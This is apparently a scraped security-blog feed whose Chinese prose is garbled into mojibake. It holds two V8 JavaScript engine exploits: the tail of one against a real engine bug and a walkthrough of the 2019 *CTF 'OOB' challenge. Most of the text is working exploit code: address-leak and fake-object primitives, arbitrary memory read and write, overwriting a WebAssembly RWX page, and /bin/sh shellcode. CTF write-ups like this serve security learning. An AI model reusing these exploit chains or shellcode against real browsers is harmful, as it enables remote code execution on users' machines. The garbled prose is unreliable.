class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><span class="hljs-keyword">var</span> u32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br>array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br><br>length_as_double =<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>([<span class="hljs-number">0x22222222n</span>]).<span class="hljs-property">buffer</span>)[<span class="hljs-number">0</span>];<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">d2u</span>(<span class="hljs-params">v</span>) &#123;<br>  f64[<span class="hljs-number">0</span>] = v;<br>  <span class="hljs-keyword">return</span> u32;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u2d</span>(<span class="hljs-params">lo, hi</span>) &#123;<br>  u32[<span class="hljs-number">0</span>] = lo;<br>  u32[<span class="hljs-number">1</span>] = hi;<br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>    <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    bigUint64[<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObj</span>(<span class="hljs-params">addr_to_fake</span>)<br>&#123;<br>    double_array[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(addr_to_fake + <span class="hljs-number">1n</span>);<br>    double_array[<span class="hljs-number">1</span>] = obj_map;<br>    <span class="hljs-keyword">let</span> faked_obj = double_array[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> faked_obj;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj_to_leak</span>)<br>&#123;<br>    obj_array[<span class="hljs-number">0</span>] = obj_to_leak;<br>    double_array[<span class="hljs-number">8</span>] = array_map;<br>    <span class="hljs-keyword">let</span> obj_addr = <span class="hljs-title function_">ftoi</span>(obj_array[<span class="hljs-number">0</span>]) - <span class="hljs-number">1n</span>;<br>    double_array[<span class="hljs-number">8</span>] = obj_map;<br>    <span class="hljs-keyword">return</span> obj_addr;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr, data</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    fake_object[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x10n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array, oob</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>; <span class="hljs-comment">// 1 2</span><br>  x *= <span class="hljs-number">10</span>; <span class="hljs-comment">// 10 20</span><br>  x -= <span class="hljs-number">9</span>; <span class="hljs-comment">// 1 11</span><br>  oob[x] = length_as_double; <span class="hljs-comment">// fake length</span><br>&#125;<br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  vul = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.1</span>];<br>  pad = [vul];<br>  double_array = [<span class="hljs-number">3.1</span>];<br>  obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">2.1</span>&#125;;<br>  obj_array = [obj];<br>  <span class="hljs-title function_">trigger</span>(giant_array, vul);<br>&#125;<br><br><span class="hljs-keyword">var</span> array_map = double_array[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">var</span> obj_map = double_array[<span class="hljs-number">8</span>];<br><br><span class="hljs-keyword">var</span> fake_array = [<br>  array_map,<br>  <span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br><br>fake_array_addr = <span class="hljs-title function_">addressOf</span>(fake_array);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak fake_array addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(fake_array_addr));<br>fake_object_addr = fake_array_addr + <span class="hljs-number">0x48n</span>;<br><span class="hljs-keyword">var</span> fake_object = <span class="hljs-title function_">fakeObj</span>(fake_object_addr);<br><span class="hljs-keyword">var</span> wasm_instance_addr = <span class="hljs-title function_">addressOf</span>(wasmInstance);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(wasm_instance_addr));<br><span class="hljs-keyword">var</span> rwx_page_addr = <span class="hljs-title function_">read64</span>(wasm_instance_addr + <span class="hljs-number">0x68n</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(rwx_page_addr)));<br><br><span class="hljs-keyword">var</span> shellcode = [<br>  <span class="hljs-number">0x2fbb485299583b6an</span>,<br>  <span class="hljs-number">0x5368732f6e69622fn</span>,<br>  <span class="hljs-number">0x050f5e5457525f54n</span><br>];<br><br><span class="hljs-title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);<br><span class="hljs-title function_">f</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019 starctf OOB</title>
    <link href="/2023/04/13/starctf-2019-OOB/"/>
    <url>/2023/04/13/starctf-2019-OOB/</url>
    
    <content type="html"><![CDATA[<p>å®æˆ˜ä½†æ²¡å®Œå…¨å®æˆ˜</p><span id="more"></span><h1 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h1><p>ï¼ˆç”±äºä¸ä¼šçœ‹C++æºç è€Œè·³è¿‡æ¼æ´åˆ†æçš„æˆ‘å°±æ˜¯ä¸ªå±‘o(Tãƒ˜To)ï¼‰<br>åœ¨obb.diffä¸­ï¼Œç»™å˜é‡æ·»åŠ äº†ä¸€ä¸ªoobå‡½æ•°ï¼Œå­˜åœ¨off by oneå¯ä»¥è¶Šç•Œè¯»å†™64bitï¼Œtest.jså¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>  <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    bigUint64[<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">var</span> a = [<span class="hljs-number">2.1</span>];<br><span class="hljs-keyword">var</span> x = a.<span class="hljs-title function_">oob</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;x is 0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(x)));<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">SystemBreak</span>();<br>a.<span class="hljs-title function_">oob</span>(<span class="hljs-number">2.1</span>);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>DebugPrintçš„å†…å®¹å¦‚ä¸‹ï¼š</p><img src="/2023/04/13/starctf-2019-OOB/output.png" class title="output"><p>å˜é‡açš„ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2023/04/13/starctf-2019-OOB/a.png" class title="a"><p>åœ°å€æ²¡æœ‰å‹ç¼©ï¼Œå¯ä»¥çœ‹å‡ºa.oob()æ‰“å°å‡ºäº†mapçš„åœ°å€<br>ç»§ç»­æ‰§è¡Œï¼Œa.oob(2.1)åçš„açš„å†…å­˜å¸ƒå±€æ˜¯è¿™æ ·çš„ï¼š</p><img src="/2023/04/13/starctf-2019-OOB/change.png" class title="change"><p>açš„mapè¢«æ”¹æˆäº†2.1</p><h1 id="å¥—æ¨¡æ¿ç¼–å†™exp"><a href="#å¥—æ¨¡æ¿ç¼–å†™exp" class="headerlink" title="å¥—æ¨¡æ¿ç¼–å†™exp"></a>å¥—æ¨¡æ¿ç¼–å†™exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//64ä½æµ®ç‚¹æ•°å’Œæ•´æ•°è½¬åŒ–ç›¸å…³å˜é‡å£°æ˜</span><br><span class="hljs-comment">//ä¸¤ä¸ªå¯¹è±¡ä»¥ä¸åŒæ–¹å¼è¯»å†™ä¸€å—å†…å­˜</span><br><span class="hljs-keyword">var</span> f64=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-comment">//ä»»æ„å¯¹è±¡è¯»å†™ç›¸å…³å˜é‡å£°æ˜</span><br><span class="hljs-keyword">var</span> double_array=[<span class="hljs-number">1.1</span>];<br><span class="hljs-keyword">var</span> obj=&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_array=[obj];<br><span class="hljs-keyword">var</span> double_map=double_array.<span class="hljs-title function_">oob</span>();<br><span class="hljs-keyword">var</span> obj_map=obj_array.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-comment">//ä»»æ„è¯»å†™ç›¸å…³å˜é‡å£°æ˜</span><br><span class="hljs-keyword">var</span> fake_array=[<br>double_map,<span class="hljs-comment">//64bit map addr</span><br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0n</span>),<span class="hljs-comment">//64bit properties addr</span><br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0x41414141n</span>),<span class="hljs-comment">//64bit elements addr</span><br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0x100000000n</span>),<span class="hljs-comment">//64bit length</span><br>];<br><br><span class="hljs-comment">//wasmç›¸å…³å˜é‡å£°æ˜</span><br><span class="hljs-keyword">var</span> wasmCode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasmModule=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule,&#123;&#125;);<br><span class="hljs-keyword">var</span> f=wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><br><span class="hljs-comment">//64ä½æµ®ç‚¹æ•°å’Œæ•´æ•°ç›¸äº’è½¬åŒ–</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>f64[<span class="hljs-number">0</span>]=f;<br><span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>bigUint64[<span class="hljs-number">0</span>]=i;<br><span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-comment">//åå…­è¿›åˆ¶è¾“å‡º</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br><span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//ä»»æ„ç»“æ„ä½“è¯»å†™</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObj</span>(<span class="hljs-params">addr_to_fake</span>)<br>&#123;<br>    double_array[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(addr_to_fake + <span class="hljs-number">1n</span>);<br>    double_array.<span class="hljs-title function_">oob</span>(obj_map);<span class="hljs-comment">//å°†æµ®ç‚¹å‹æ•°ç»„ä¼ªé€ æˆå¯¹è±¡æ•°ç»„</span><br>    <span class="hljs-keyword">let</span> faked_obj = double_array[<span class="hljs-number">0</span>];<br>    double_array.<span class="hljs-title function_">oob</span>(array_map);<br>    <span class="hljs-keyword">return</span> faked_obj;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj_to_leak</span>)<span class="hljs-comment">//å°†ç”¨arrayä¼ªé€ çš„æ•°æ®è½¬ä¸ºobject</span><br>&#123;<br>    obj_array[<span class="hljs-number">0</span>] = obj_to_leak;<br>    obj_array.<span class="hljs-title function_">oob</span>(double_map);<span class="hljs-comment">//å°†å¯¹è±¡æ•°ç»„ä¼ªé€ æˆæµ®ç‚¹å‹æ•°ç»„</span><br>    <span class="hljs-keyword">let</span> obj_addr = <span class="hljs-title function_">ftoi</span>(obj_array[<span class="hljs-number">0</span>]) - <span class="hljs-number">1n</span>;<br>    obj_array.<span class="hljs-title function_">oob</span>(obj_map);<br>    <span class="hljs-keyword">return</span> obj_addr;<br>&#125;<br><br><span class="hljs-comment">//ä»»æ„è¯»å†™å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>fake_array[<span class="hljs-number">2</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">1n</span>);<br><span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr,data</span>)<br>&#123;<br>fake_array[<span class="hljs-number">2</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">1n</span>);<br>fake_object[<span class="hljs-number">0</span>]=<span class="hljs-title function_">itof</span>(data);<br>&#125;<br><br><span class="hljs-comment">//shellcodeå†™å¦‚rwxå‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode,rwx_addr</span>)<br>&#123;<br><span class="hljs-keyword">var</span> data_buf=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span>*<span class="hljs-number">8</span>);<br><span class="hljs-keyword">var</span> data_view=<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br><span class="hljs-keyword">var</span> buf_backing_store_addr=<span class="hljs-title function_">addressOf</span>(data_buf)+<span class="hljs-number">0x20n</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br><span class="hljs-title function_">write64</span>(buf_backing_store_addr,<span class="hljs-title function_">ftoi</span>(rwx_addr));<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;shellcode.<span class="hljs-property">length</span>;++i)<br>data_view.<span class="hljs-title function_">setFloat64</span>(i*<span class="hljs-number">8</span>,<span class="hljs-title function_">itof</span>(shellcode[i],<span class="hljs-literal">true</span>));<br>&#125;<br><br><span class="hljs-comment">//å°†ç”¨arrayä¼ªé€ çš„fake_objectè½¬åŒ–ä¸ºobject</span><br>fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak fake_array addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(fake_array_addr));<br>fake_object_addr=fake_array_addr+<span class="hljs-number">0x30n</span>;<span class="hljs-comment">//fake_arrayçš„elementsåœ¨+0x30çš„ä½ç½®</span><br><span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObj</span>(fake_object_addr);<br><br><span class="hljs-keyword">var</span> wasm_instance_addr=<span class="hljs-title function_">addressOf</span>(wasmInstance);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(wasm_instance_addr));<br><span class="hljs-keyword">var</span> rwx_page_addr=<span class="hljs-title function_">read64</span>(wasm_instance_addr+<span class="hljs-number">0x88</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(rwx_page_addr)));<br><br><span class="hljs-keyword">var</span> shellcode=[<br><span class="hljs-number">0x2fbb485299583b6an</span>,<br><span class="hljs-number">0x5368732f6e69622fn</span>,<br><span class="hljs-number">0x050f5e5457525f54n</span><br>];<br><br><span class="hljs-title function_">copy_shellcode_to_rwx</span>(shellcode,rwx_page_addr)<br><span class="hljs-title 